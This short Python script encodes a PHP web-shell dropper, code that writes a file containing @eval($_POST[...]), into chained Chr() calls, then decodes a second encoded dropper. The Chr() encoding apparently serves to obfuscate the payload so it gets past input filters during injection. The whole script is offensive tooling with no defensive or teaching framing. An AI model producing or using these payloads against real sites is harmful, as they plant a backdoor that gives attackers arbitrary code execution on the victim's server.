ascii_code = "fputs(fopen('apps.php','w'),'<?php @eval($_POST[77])?>');"
ascii_encoded = ''.join('Chr('+str(ord(char))+').' for char in ascii_code)
print(ascii_encoded)




encoded_string = "Chr(102)Chr(112)Chr(117)Chr(116)Chr(115)Chr(40)Chr(102)Chr(111)Chr(112)Chr(101)Chr(110)Chr(40)Chr(39)Chr(119)Chr(102)Chr(46)Chr(112)Chr(104)Chr(112)Chr(39)Chr(44)Chr(39)Chr(119)Chr(39)Chr(41)Chr(44)Chr(39)Chr(60)Chr(63)Chr(112)Chr(104)Chr(112)Chr(32)Chr(64)Chr(101)Chr(118)Chr(97)Chr(108)Chr(40)Chr(36)Chr(95)Chr(80)Chr(79)Chr(83)Chr(84)Chr(91)Chr(108)Chr(97)Chr(108)Chr(97)Chr(108)Chr(97)Chr(93)Chr(41)Chr(63)Chr(62)Chr(39)Chr(41)Chr(59)"
encoded_chars = encoded_string.split('Chr(')[1:]
decoded_string = ''.join(chr(int(char.split(')')[0])) for char in encoded_chars if char)
print(decoded_string)



